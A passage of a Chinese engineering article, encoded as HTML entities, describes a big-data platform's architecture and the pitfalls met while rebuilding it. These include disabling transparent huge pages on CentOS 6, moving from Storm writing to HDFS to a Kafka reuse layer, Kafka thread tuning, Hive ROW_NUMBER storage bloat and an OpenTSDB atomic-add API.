&#x4E34;&#x65F6;&#x63D0;&#x6570;&#x5C42;(Temp)&#xFF1A;&#x5B58;&#x50A8;&#x4E34;&#x65F6;&#x63D0;&#x6570;&#x3001;&#x6570;&#x636E;&#x8D28;&#x91CF;&#x6821;&#x9A8C;&#x7B49;&#x751F;&#x4EA7;&#x7684;&#x4E34;&#x65F6;&#x6570;&#x636E;&#x3002; &#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#xFF1A;&#x57FA;&#x4E8E;Storm/JStorm&#xFF0C;Drools,Esper&#x3002;&#x4E3B;&#x8981;&#x5E94;&#x7528;&#x4E8E;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x3001;APM&#x3001;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;&#x5E73;&#x53F0;&#x3001;&#x5B9E;&#x65F6;DAU&#x7EDF;&#x8BA1;&#x7B49;&#x3002; HBase/MySQL&#xFF1A;&#x7528;&#x4E8E;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#xFF0C;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;&#x7ED3;&#x679C;&#x5B58;&#x50A8;&#x670D;&#x52A1;&#x3002; Redis&#xFF1A;&#x7528;&#x4E8E;&#x4E2D;&#x95F4;&#x8BA1;&#x7B97;&#x7ED3;&#x679C;&#x5B58;&#x50A8;&#x6216;&#x5B57;&#x5178;&#x6570;&#x636E;&#x7B49;&#x3002; Elasticsearch&#xFF1A;&#x7528;&#x4E8E;&#x660E;&#x7EC6;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x67E5;&#x8BE2;&#x53CA;HBase&#x7684;&#x4E8C;&#x7EA7;&#x7D22;&#x5F15;&#x5B58;&#x50A8;(&#x8FD9;&#x5757;&#x76EE;&#x524D;&#x5728;&#x6570;&#x636E;&#x4E2D;&#x5FC3;&#x8FD8;&#x6CA1;&#x6709;&#x5927;&#x89C4;&#x6A21;&#x4F7F;&#x7528;&#xFF0C;&#x6709;&#x5174;&#x8DA3;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x4EE5;&#x52A0;&#x5165;&#x6211;&#x4EEC;&#x4E00;&#x8D77;&#x73A9;ES)&#x3002; Druid&#xFF1A;&#x76EE;&#x524D;&#x7528;&#x4E8E;&#x652F;&#x6301;&#x5927;&#x6570;&#x636E;&#x96C6;&#x7684;&#x5FEB;&#x901F;&#x5373;&#x5E2D;&#x67E5;&#x8BE2;(ad-hoc)&#x3002; &#x6570;&#x636E;&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#xFF1A;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x5305;&#x62EC;&#x57FA;&#x7840;&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x4E0E;&#x6570;&#x636E;&#x8D28;&#x91CF;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#xFF0C;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x5206;&#x4E3A;2&#x5927;&#x65B9;&#x5411;&#xFF0C;&#x5B8F;&#x89C2;&#x5C42;&#x9762;&#x548C;&#x5FAE;&#x89C2;&#x5C42;&#x9762;&#x3002;&#x5B8F;&#x89C2;&#x89D2;&#x5EA6;&#x7684;&#x7406;&#x89E3;&#x5C31;&#x662F;&#x8FDB;&#x7A0B;&#x7EA7;&#x522B;,&#x62D3;&#x6251;&#x7ED3;&#x6784;&#x7EA7;&#x522B;,&#x62FF;Hadoop&#x4E3E;&#x4F8B;&#xFF0C;&#x5982;&#xFF1A;DataNode&#xFF0C;NameNode&#xFF0C;JournalNode&#xFF0C;ResourceManager&#xFF0C;NodeManager&#xFF0C;&#x4E3B;&#x8981;&#x5C31;&#x662F;&#x8FD9;5&#x5927;&#x7EC4;&#x4EF6;&#xFF0C;&#x901A;&#x8FC7;&#x5206;&#x6790;&#x8FD9;&#x4E9B;&#x8282;&#x70B9;&#x4E0A;&#x7684;&#x76D1;&#x63A7;&#x6570;&#x636E;&#xFF0C;&#x4E00;&#x822C;&#x4F60;&#x80FD;&#x591F;&#x5B9A;&#x4F4D;&#x5230;&#x6162;&#x8282;&#x70B9;&#xFF0C;&#x53EF;&#x80FD;&#x67D0;&#x53F0;&#x673A;&#x5668;&#x7684;&#x7F51;&#x7EDC;&#x51FA;&#x95EE;&#x9898;&#x4E86;&#xFF0C;&#x6216;&#x8005;&#x8BF4;&#x67D0;&#x53F0;&#x673A;&#x5668;&#x6267;&#x884C;&#x7684;&#x65F6;&#x95F4;&#x603B;&#x662F;&#x5927;&#x4E8E;&#x6B63;&#x5E38;&#x673A;&#x5668;&#x7B49;&#x7B49;&#x8FD9;&#x6837;&#x7C7B;&#x4F3C;&#x7684;&#x95EE;&#x9898;&#x3002;&#x521A;&#x521A;&#x8BF4;&#x7684;&#x53E6;&#x4E00;&#x4E2A;&#x76D1;&#x63A7;&#x65B9;&#x5411;&#xFF0C;&#x5C31;&#x662F;&#x5FAE;&#x89C2;&#x5C42;&#x9762;&#xFF0C;&#x5C31;&#x662F;&#x7EC6;&#x7C92;&#x5EA6;&#x5316;&#x7684;&#x76D1;&#x63A7;&#xFF0C;&#x57FA;&#x4E8E;user&#x7528;&#x6237;&#x7EA7;&#x522B;&#xFF0C;&#x57FA;&#x4E8E;&#x5355;&#x4E2A;job&#xFF0C;&#x5355;&#x4E2A;task&#x7EA7;&#x522B;&#x7684;&#x76D1;&#x63A7;&#xFF0C;&#x50CF;&#x8FD9;&#x7C7B;&#x76D1;&#x63A7;&#x6307;&#x6807;&#x5C31;&#x662F;&#x53E6;&#x4E00;&#x5927;&#x65B9;&#x5411;&#xFF0C;&#x8FD9;&#x7C7B;&#x7684;&#x76D1;&#x63A7;&#x6307;&#x6807;&#x5728;&#x5B9E;&#x9645;&#x7684;&#x4F7F;&#x7528;&#x573A;&#x666F;&#x4E2D;&#x7279;&#x522B;&#x91CD;&#x8981;&#xFF0C;&#x4E00;&#x65E6;&#x4F60;&#x7684;&#x96C6;&#x7FA4;&#x8D44;&#x6E90;&#x662F;&#x5F00;&#x653E;&#x7ED9;&#x5916;&#x9762;&#x7684;&#x7528;&#x6237;&#x4F7F;&#x7528;&#xFF0C;&#x7528;&#x6237;&#x672C;&#x8EAB;&#x4E0D;&#x4E86;&#x89E3;&#x4F60;&#x7684;&#x8FD9;&#x5957;&#x673A;&#x5236;&#x539F;&#x7406;&#xFF0C;&#x5F88;&#x5BB9;&#x6613;&#x4F1A;&#x4E71;&#x7533;&#x8BF7;&#x8D44;&#x6E90;&#xFF0C;&#x9020;&#x6210;&#x4E25;&#x91CD;&#x62D6;&#x57AE;&#x96C6;&#x7FA4;&#x6574;&#x4F53;&#x8FD0;&#x4F5C;&#x6548;&#x7387;&#x7684;&#x4E8B;&#x60C5;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x7C7B;&#x76D1;&#x63A7;&#x7684;&#x6307;&#x6807;&#x5C31;&#x662F;&#x4E3A;&#x4E86;&#x9632;&#x6B62;&#x8FD9;&#x6837;&#x7684;&#x4E8B;&#x60C5;&#x53D1;&#x751F;&#x3002;&#x76EE;&#x524D;&#x6211;&#x4EEC;&#x4E3B;&#x8981;&#x5B9E;&#x73B0;&#x4E86;&#x5B8F;&#x89C2;&#x5C42;&#x9762;&#x7684;&#x76D1;&#x63A7;&#x3002;&#x5982;&#xFF1A;&#x6570;&#x636E;&#x8D28;&#x91CF;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x5B9E;&#x73B0;&#x65B9;&#x6848;&#x5982;&#x4E0B;: &#x4E09;&#x3001;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x8FC7;&#x7A0B;&#x4E2D;&#x8E29;&#x8FC7;&#x7684;&#x5751;&#x6211;&#x4EEC;&#x5728;&#x5927;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x91CD;&#x6784;&#x8FC7;&#x7A0B;&#x4E2D;&#x8E29;&#x8FC7;&#x7684;&#x5751;&#xFF0C;&#x5927;&#x81F4;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x3001;&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x3001;&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x4E09;&#x7C7B;&#xFF0C;&#x4E0B;&#x9762;&#x4E3B;&#x8981;&#x5217;&#x4E3E;&#x4E9B;&#x6BD4;&#x8F83;&#x5178;&#x578B;&#x7684;&#xFF0C;&#x82B1;&#x65F6;&#x95F4;&#x6BD4;&#x8F83;&#x957F;&#x7684;&#x95EE;&#x9898;&#x3002; 1. &#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x7EA7;&#x7684;&#x5751;Hadoop&#x7684;I/O&#x6027;&#x80FD;&#x5F88;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x4F9D;&#x8D56;&#x4E8E;Linux&#x672C;&#x5730;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;&#x8BFB;&#x5199;&#x6027;&#x80FD;&#x3002;Linux&#x4E2D;&#x6709;&#x591A;&#x79CD;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x53EF;&#x4F9B;&#x9009;&#x62E9;&#xFF0C;&#x6BD4;&#x5982;ext3&#x548C;ext4&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x6027;&#x80FD;&#x6709;&#x4E00;&#x5B9A;&#x7684;&#x5DEE;&#x522B;&#x3002;&#x6211;&#x4EEC;&#x4E3B;&#x8981;&#x60F3;&#x5229;&#x7528;ext4&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x7684;&#x7279;&#x6027;&#xFF0C;&#x7531;&#x4E8E;&#x4E4B;&#x524D;&#x7684;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x90FD;&#x662F;CentOS5.9&#x4E0D;&#x652F;&#x6301;ext4&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#xFF0C;&#x6240;&#x4EE5;&#x8003;&#x8651;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x5347;&#x7EA7;&#x4E3A;CentOS6.3&#x7248;&#x672C;&#xFF0C;&#x90E8;&#x7F72;Hadoop&#x96C6;&#x7FA4;&#x540E;&#xFF0C;&#x4F5C;&#x4E1A;&#x4E00;&#x542F;&#x52A8;&#xFF0C;&#x5C31;&#x51FA;&#x73B0;CPU&#x5185;&#x6838;&#x8FC7;&#x9AD8;&#x7684;&#x95EE;&#x9898;&#x3002;&#x5982;&#x4E0B;&#x56FE;&#xFF1A; &#x7ECF;&#x8FC7;&#x5F88;&#x957F;&#x65F6;&#x95F4;&#x7684;&#x6D4B;&#x8BD5;&#x9A8C;&#x8BC1;&#xFF0C;&#x53D1;&#x73B0;CentOS6&#x4F18;&#x5316;&#x4E86;&#x5185;&#x5B58;&#x7533;&#x8BF7;&#x7684;&#x6548;&#x7387;&#xFF0C;&#x5F15;&#x5165;&#x4E86;THP&#x7684;&#x7279;&#x6027;&#xFF0C;&#x800C;Hadoop&#x662F;&#x9AD8;&#x5BC6;&#x96C6;&#x578B;&#x5185;&#x5B58;&#x8FD0;&#x7B97;&#x7CFB;&#x7EDF;&#xFF0C;&#x8FD9;&#x4E2A;&#x6539;&#x52A8;&#x7ED9;hadoop&#x5E26;&#x6765;&#x4E86;&#x526F;&#x4F5C;&#x7528;&#x3002;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x5185;&#x6838;&#x53C2;&#x6570;&#x4F18;&#x5316;&#x5173;&#x95ED;&#x7CFB;&#x7EDF;THP&#x7279;&#x6027;&#xFF0C;CPU&#x5185;&#x6838;&#x4F7F;&#x7528;&#x7387;&#x9A6C;&#x4E0A;&#x4E0B;&#x964D;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;:echo never &gt; /sys/kernel/mm/redhat_transparent_hugepage/enabledecho never &gt; /sys/kernel/mm/redhat_transparent_hugepage/defrag 2.&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x7684;&#x5751;&#x6700;&#x521D;&#x7684;&#x6570;&#x636E;&#x6D41;&#x67B6;&#x6784;&#x662F;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x7F51;&#x5173;&#x628A;&#x6570;&#x636E;&#x4E0A;&#x62A5;&#x7ED9;Kafka&#xFF0C;&#x518D;&#x7531;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;&#x5E73;&#x53F0;(ETL)&#x505A;&#x9884;&#x5904;&#x7406;&#x540E;&#x76F4;&#x63A5;&#x5B9E;&#x65F6;&#x5199;&#x5165;HDFS&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#xFF1A; &#x6B64;&#x67B6;&#x6784;&#xFF0C;&#x9700;&#x8981;&#x7EF4;&#x6301;HDFS Client&#x7684;&#x957F;&#x8FDE;&#x63A5;&#xFF0C;&#x7531;&#x4E8E;&#x7F51;&#x7EDC;&#x7B49;&#x5404;&#x79CD;&#x539F;&#x56E0;&#x5BFC;&#x81F4;Storm&#x5B9E;&#x65F6;&#x5199;&#x5165;HDFS&#x7ECF;&#x5E38;&#x4E0D;&#x7A33;&#x5B9A;&#xFF0C;&#x9694;&#x4E09;&#x5DEE;&#x4E94;&#x7684;&#x51FA;&#x73B0;&#x6570;&#x636E;&#x5F02;&#x5E38;&#xFF0C;&#x4F7F;&#x540E;&#x9762;&#x7684;&#x8BA1;&#x7B97;&#x7ED3;&#x679C;&#x5F02;&#x5E38;&#x4E0D;&#x65AD;&#xFF0C;&#x5F53;&#x65F6;&#x5C1D;&#x8BD5;&#x8FC7;&#x5F88;&#x591A;&#x79CD;&#x624B;&#x6BB5;&#x53BB;&#x4F18;&#x5316;&#xFF0C;&#x5982;&#xFF1A;&#x4FDD;&#x8BC1;&#x957F;&#x8FDE;&#x63A5;&#x3001;&#x8FDE;&#x63A5;&#x65AD;&#x540E;&#x91CD;&#x8BD5;&#x673A;&#x5236;&#x3001;&#x8C03;&#x6574;HDFS&#x670D;&#x52A1;&#x7AEF;&#x53C2;&#x6570;&#x7B49;&#xFF0C;&#x90FD;&#x89E3;&#x51B3;&#x7684;&#x4E0D;&#x662F;&#x5F7B;&#x5E95;&#x3002;&#x6BCF;&#x5929;&#x5F02;&#x5E38;&#x4E0D;&#x65AD;&#xFF0C;&#x65E7;&#x5F02;&#x5E38;&#x6CA1;&#x89E3;&#x51B3;&#xFF0C;&#x65B0;&#x5F02;&#x5E38;&#x53C8;&#x6765;&#x4E86;&#xFF0C;&#x5728;&#x538B;&#x529B;&#x5C71;&#x5927;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x8003;&#x8651;&#x4ECE;&#x67B6;&#x6784;&#x89D2;&#x5EA6;&#x8C03;&#x6574;&#xFF0C;&#x4E0D;&#x80FD;&#x53EA;&#x4ECE;&#x5177;&#x4F53;&#x7684;&#x6280;&#x672F;&#x70B9;&#x53BB;&#x4F18;&#x5316;&#x4E86;&#xFF0C;&#x5728;&#x505A;&#x67B6;&#x6784;&#x8C03;&#x6574;&#x65F6;&#xFF0C;&#x8003;&#x8651;&#x5230;&#x6211;&#x4EEC;&#x67B6;&#x6784;&#x91CD;&#x6784;&#x7684;&#x521D;&#x8877;&#xFF0C;&#x63D0;&#x9AD8;&#x6570;&#x636E;&#x7684;&#x5B9E;&#x65F6;&#x6027;&#xFF0C;&#x5C3D;&#x91CF;&#x8BA9;&#x8BA1;&#x7B97;&#x4EFB;&#x52A1;&#x5B9E;&#x65F6;&#x5316;&#xFF0C;&#x4F46;&#x91CD;&#x6784;&#x8FC7;&#x7A0B;&#x4E2D;&#x8981;&#x8003;&#x8651;&#x73B0;&#x6709;&#x4E1A;&#x52A1;&#x7684;&#x8FC7;&#x6E21;&#xFF0C;&#x6240;&#x4EE5;&#x67B6;&#x6784;&#x5FC5;&#x987B;&#x652F;&#x6301;&#x5B9E;&#x65F6;&#x4E0E;&#x79BB;&#x7EBF;&#x7684;&#x9700;&#x6C42;&#xFF0C;&#x7ED3;&#x5408;&#x8FD9;&#x4E9B;&#x9700;&#x6C42;&#xFF0C;&#x5728;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;&#x5E73;&#x53F0;(ETL)&#x540E;&#x52A0;&#x4E86;&#x4E00;&#x5C42;&#x6570;&#x636E;&#x7F13;&#x5B58;&#x91CD;&#x7528;&#x5C42;(kafka)&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7ECF;&#x8FC7;&#x6570;&#x636E;&#x5B9E;&#x65F6;&#x6E05;&#x6D17;&#x5E73;&#x53F0;&#x540E;&#x7684;&#x6570;&#x636E;&#x8FD8;&#x662F;&#x5199;&#x5165;kafka&#x96C6;&#x7FA4;&#xFF0C;&#x7531;&#x4E8E;kafka&#x652F;&#x6301;&#x91CD;&#x590D;&#x6D88;&#x8D39;&#xFF0C;&#x6240;&#x4EE5;&#x540C;&#x4E00;&#x4EFD;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x65E2;&#x6EE1;&#x8DB3;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x4E5F;&#x6EE1;&#x8DB3;&#x79BB;&#x7EBF;&#x8BA1;&#x7B97;&#xFF0C;&#x4ECE;&#x4E0A;&#x9762;&#x7684;&#x6574;&#x4F53;&#x6280;&#x672F;&#x67B6;&#x6784;&#x4E5F;&#x53EF;&#x4EE5;&#x770B;&#x51FA;&#xFF0C;&#x5982;&#x4E0B;&#x56FE;&#xFF1A; KG-Camus&#x7EC4;&#x4EF6;&#x4E5F;&#x662F;&#x57FA;&#x4E8E;&#x67B6;&#x6784;&#x8C03;&#x6574;&#x540E;&#xFF0C;&#x91CD;&#x65B0;&#x5B9E;&#x73B0;&#x4E86;&#x4E00;&#x5957;&#x79BB;&#x7EBF;&#x6D88;&#x8D39;Kafka&#x96C6;&#x7FA4;&#x6570;&#x636E;&#x7684;&#x7EC4;&#x4EF6;&#xFF0C;&#x6B64;&#x7EC4;&#x4EF6;&#x662F;&#x53C2;&#x8003;LinkedIn&#x7684;Camus&#x5B9E;&#x73B0;&#x7684;&#x3002;&#x6B64;&#x65B9;&#x5F0F;&#xFF0C;&#x4F7F;&#x6570;&#x636E;&#x6D88;&#x8D39;&#x6A21;&#x5F0F;&#x7531;&#x539F;&#x6765;&#x7684;&#x63A8;&#x65B9;&#x5F0F;&#x6539;&#x4E3A;&#x62C9;&#x6A21;&#x5F0F;&#x4E86;&#xFF0C;&#x4E0D;&#x7528;&#x7EF4;&#x6301;HDFS Client&#x7684;&#x957F;&#x8FDE;&#x63A5;&#x7B49;&#x529F;&#x80FD;&#x4E86;&#xFF0C;&#x76F4;&#x63A5;&#x7531;&#x4F5C;&#x4E1A;&#x8C03;&#x5EA6;&#x7CFB;&#x7EDF;&#x6BCF;&#x9694;&#x65F6;&#x95F4;&#x53BB;&#x62C9;&#x4E00;&#x6B21;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x4E1A;&#x52A1;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E0D;&#x540C;&#x7684;&#x65F6;&#x95F4;&#x95F4;&#x9694;&#xFF0C;&#x4ECE;&#x6B64;&#x67B6;&#x6784;&#x8C03;&#x6574;&#x4E0A;&#x7EBF;&#x540E;&#xFF0C;&#x57FA;&#x672C;&#x6CA1;&#x6709;&#x7C7B;&#x4F3C;&#x7684;&#x5F02;&#x5E38;&#x51FA;&#x73B0;&#x4E86;&#x3002;&#x8FD9;&#x4E2A;&#x5751;&#xFF0C;&#x662F;&#x6211;&#x81EA;&#x5DF1;&#x7ED9;&#x81EA;&#x5DF1;&#x6316;&#x7684;&#xFF0C;&#x5BFC;&#x81F4;&#x6211;&#x4EEC;&#x7684;&#x91CD;&#x6784;&#x8BA1;&#x5212;&#x5EF6;&#x671F;2&#x4E2A;&#x6708;&#xFF0C;&#x4E3B;&#x8981;&#x539F;&#x56E0;&#x662F;&#x7531;&#x6700;&#x521D;&#x6280;&#x672F;&#x9884;&#x7814;&#x7A76;&#x6D4B;&#x8BD5;&#x4E0D;&#x5145;&#x5206;&#x6240;&#x5BFC;&#x81F4;&#x3002; 3.&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x7684;&#x5751;&#x7531;&#x4E8E;&#x6574;&#x4E2A;&#x6570;&#x636E;&#x5E73;&#x53F0;&#x6D89;&#x53CA;&#x5230;&#x7684;&#x5F00;&#x6E90;&#x7EC4;&#x4EF6;&#x5F88;&#x591A;&#xFF0C;&#x8E29;&#x8FC7;&#x7684;&#x5751;&#x4E5F;&#x662F;&#x5341;&#x4E2A;&#x624B;&#x6307;&#x6570;&#x4E0D;&#x8FC7;&#x6765;&#x3002; (1)&#x3001;&#x5F53;&#x6211;&#x4EEC;&#x7684;&#x884C;&#x4E3A;&#x6570;&#x636E;&#x5168;&#x91CF;&#x63A5;&#x5165;&#x5230;Kafka&#x96C6;&#x7FA4;(&#x51E0;&#x767E;&#x4EBF;/&#x5929;)&#xFF0C;&#x6570;&#x636E;&#x91C7;&#x96C6;&#x7F51;&#x5361;&#x51FA;&#x73B0;&#x5927;&#x91CF;&#x8FDE;&#x63A5;&#x8D85;&#x65F6;&#x73B0;&#x8C61;&#xFF0C;&#x4F46;&#x4E07;&#x5146;&#x7F51;&#x5361;&#x8FDB;&#x51FA;&#x6D41;&#x91CF;&#x4F7F;&#x7528;&#x7387;&#x5E76;&#x4E0D;&#x662F;&#x5F88;&#x9AD8;&#xFF0C;&#x53EA;&#x6709;&#x51E0;&#x767E;Mbit/s&#xFF0C;&#x7ECF;&#x8FC7;&#x5927;&#x91CF;&#x7684;&#x6D4B;&#x8BD5;&#x6392;&#x67E5;&#x540E;&#xFF0C;&#x8C03;&#x6574;&#x4EE5;&#x4E0B;&#x53C2;&#x6570;&#xFF0C;&#x5C31;&#x662F;&#x987A;&#x5229;&#x89E3;&#x51B3;&#x4E86;&#x6B64;&#x95EE;&#x9898;&#x3002;&#x8C03;&#x6574;&#x53C2;&#x6570;&#x540E;&#x7F51;&#x5361;&#x6D41;&#x91CF;&#x5982;&#x4E0B;&#x56FE;&#xFF1A; a)&#x3001;num.network.threads(&#x7F51;&#x7EDC;&#x5904;&#x7406;&#x7EBF;&#x7A0B;&#x6570;)&#x503C;&#x5E94;&#x8BE5;&#x6BD4;cpu&#x6570;&#x7565;&#x5927;b)&#x3001;num.io.threads(&#x63A5;&#x6536;&#x7F51;&#x7EDC;&#x7EBF;&#x7A0B;&#x8BF7;&#x6C42;&#x5E76;&#x5904;&#x7406;&#x7EBF;&#x7A0B;&#x6570;)&#x503C;&#x63D0;&#x9AD8;&#x4E3A;cpu&#x6570;&#x4E24;&#x500D; (2)&#x3001;&#x5728;hive0.14 &#x7248;&#x672C;&#x4E2D;&#xFF0C;&#x5229;&#x7528;&#x51FD;&#x6570;ROW_NUMBER OVER&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x6570;&#x636E;&#x5904;&#x7406;&#x540E;&#xFF0C;&#x5BFC;&#x81F4;&#x5927;&#x91CF;&#x7684;&#x4F5C;&#x4E1A;&#x51FA;&#x73B0;&#x5EF6;&#x65F6;&#x5F88;&#x5927;&#x7684;&#x73B0;&#x8C61;&#xFF0C;&#x7ECF;&#x5F02;&#x5E38;&#x6392;&#x67E5;&#x540E;&#xFF0C;&#x53D1;&#x73B0;&#x5728;&#x6570;&#x636E;&#x8BB0;&#x5F55;&#x6570;&#x6CA1;&#x53D8;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x6570;&#x636E;&#x7684;&#x5B58;&#x50A8;&#x5BB9;&#x91CF;&#x6269;&#x5927;&#x5230;&#x539F;&#x6765;&#x7684;5&#x500D;&#x5DE6;&#x53F3;&#xFF0C;&#x5BFC;&#x81F4;MapReduce&#x6267;&#x884C;&#x5F88;&#x6162;&#x9020;&#x6210;&#x7684;&#x3002;&#x6539;&#x4E3A;&#x81EA;&#x5DF1;&#x5B9E;&#x73B0;&#x7C7B;&#x4F3C;&#x7684;&#x51FD;&#x6570;&#x540E;&#xFF0C;&#x89E3;&#x51B3;&#x4E86;&#x5BB9;&#x91CF;&#x6269;&#x5927;&#x4E3A;&#x539F;&#x6765;&#x51E0;&#x500D;&#x7684;&#x73B0;&#x8C61;&#x3002;&#x8BF4;&#x5230;&#x8FD9;&#x91CC;&#xFF0C;&#x4E5F;&#x5728;&#x6B64;&#x8BF7;&#x6559;&#x8BFB;&#x5230;&#x6B64;&#x5904;&#x7684;&#x8BFB;&#x8005;&#x4E00;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x5728;&#x6D77;&#x91CF;&#x6570;&#x636E;&#x53BB;&#x91CD;&#x4E2D;&#x91C7;&#x7528;&#x4EC0;&#x4E48;&#x7B97;&#x6CD5;&#x6216;&#x7EC4;&#x4EF6;&#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#x5408;&#x9002;&#xFF0C;&#x65E2;&#x80FD;&#x9AD8;&#x6027;&#x80FD;&#x53C8;&#x80FD;&#x9AD8;&#x51C6;&#x786E;&#x6027;&#xFF0C;&#x6709;&#x597D;&#x7684;&#x5EFA;&#x8BAE;&#x6216;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x53EF;&#x4EE5;&#x52A0;happyjim2010&#x5FAE;&#x4FE1;&#x79C1;&#x6211;&#x3002; (3)&#x3001;&#x5728;&#x4E1A;&#x52A1;&#x5B9E;&#x65F6;&#x76D1;&#x63A7;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x7528;OpenTSDB&#x4E0E;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x7CFB;&#x7EDF;(storm)&#x7ED3;&#x5408;&#xFF0C;&#x7528;&#x4E8E;&#x805A;&#x5408;&#x5E76;&#x5B58;&#x50A8;&#x5B9E;&#x65F6;metric&#x6570;&#x636E;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x5B9E;&#x73B0;&#x4E2D;&#xFF0C;&#x901A;&#x5E38;&#x9700;&#x8981;&#x5728;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x90E8;&#x5206;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x65F6;&#x95F4;&#x7A97;&#x53E3;(window)&#xFF0C;&#x7528;&#x4E8E;&#x805A;&#x5408;&#x5B9E;&#x65F6;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x805A;&#x5408;&#x7ED3;&#x679C;&#x5199;&#x5165;tsdb&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x7531;&#x4E8E;&#x5728;&#x5B9E;&#x9645;&#x60C5;&#x51B5;&#x4E2D;&#xFF0C;&#x5B9E;&#x65F6;&#x6570;&#x636E;&#x5728;&#x91C7;&#x96C6;&#x3001;&#x4E0A;&#x62A5;&#x9636;&#x6BB5;&#x53EF;&#x80FD;&#x4F1A;&#x5B58;&#x5728;&#x5EF6;&#x65F6;&#xFF0C;&#x800C;&#x5BFC;&#x81F4;tsdb&#x5199;&#x5165;&#x7684;&#x6570;&#x636E;&#x4E0D;&#x51C6;&#x786E;&#x3002;&#x9488;&#x5BF9;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#xFF0C;&#x6211;&#x4EEC;&#x505A;&#x4E86;&#x4E00;&#x4E2A;&#x6539;&#x8FDB;&#xFF0C;&#x5728;&#x539F;&#x6709;tsdb&#x5199;&#x5165;api&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x589E;&#x52A0;&#x4E86;&#x4E00;&#x4E2A;&#x539F;&#x5B50;&#x52A0;&#x7684;api&#x3002;&#x8FD9;&#x6837;&#xFF0C;&#x5EF6;&#x8FDF;&#x5230;&#x6765;&#x7684;&#x6570;&#x636E;&#x4F1A;&#x88AB;&#x53E0;&#x52A0;&#x5230;&#x4E4B;&#x524D;&#x5199;&#x5165;&#x7684;&#x6570;&#x636E;&#x4E4B;&#x4E0A;&#xFF0C;&#x5B9E;&#x65F6;&#x7684;&#x51C6;&#x786E;&#x6027;&#x7531;&#x4E8E;&#x4E0D;&#x53EF;&#x907F;&#x514D;&#x7684;&#x539F;&#x56E0;(&#x91C7;&#x96C6;&#x3001;&#x4E0A;&#x62A5;&#x9636;&#x6BB5;)&#x4EA7;&#x751F;&#x4E86;&#x5EF6;&#x8FDF;&#xFF0C;&#x5230;&#x6700;&#x7EC8;&#x7684;&#x51C6;&#x786E;&#x6027;&#x4E5F;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x4FDD;&#x8BC1;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x6DFB;&#x52A0;&#x4E86;&#x8FD9;&#x4E2A;&#x6539;&#x8FDB;&#x4E4B;&#x540E;&#xFF0C;&#x5B9E;&#x65F6;&#x8BA1;&#x7B97;&#x7AEF;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#x5C31;&#x4E0D;&#x9700;&#x8981;&#x56E0;&#x4E3A;&#x8003;&#x8651;&#x5EF6;&#x8FDF;&#x95EE;&#x9898;&#x8BBE;&#x7F6E;&#x5F97;&#x6BD4;&#x8F83;&#x5927;&#xFF0C;&#x8FD9;&#x6837;&#x65E2;&#x8282;&#x7701;&#x4E86;&#x5185;&#x5B58;&#x7684;&#x6D88;&#x8017;&#xFF0C;&#x4E5F;&#x63D0;&#x9AD8;&#x